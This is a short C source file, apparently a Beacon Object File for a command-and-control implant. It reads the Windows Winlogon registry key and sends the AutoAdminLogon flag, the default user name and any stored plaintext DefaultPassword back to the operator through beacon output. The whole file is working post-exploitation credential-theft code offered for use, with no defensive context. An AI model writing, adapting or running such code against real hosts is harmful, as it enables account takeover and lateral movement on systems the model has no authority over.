#include <windows.h>
#include <stdbool.h>
#include "beacon.h"
#include "bofdefs.h"

void go() {
    HKEY hKey;
    DWORD dwType = REG_SZ;
    char szValue[256] = { 0 };
    DWORD dwSize = sizeof(szValue);

    if (Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (Advapi32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: %s\n", szValue);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] AutoAdminLogon: Not Found\n");
        }

        // Reset value of dwSize
        dwSize = sizeof(szValue);
        if (Advapi32$RegQueryValueExA(hKey, "DefaultUserName", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: %s\n", szValue);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultUserName: Not Found\n");
        }

        // Reset value of dwSize
        dwSize = sizeof(szValue);
        if (Advapi32$RegQueryValueExA(hKey, "DefaultPassword", NULL, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: %s\n", szValue);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] DefaultPassword: Not Found\n");
        }

        Advapi32$RegCloseKey(hKey);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[AUTOLOGON] No Autologon Registry Key Found.\n");
    }
}
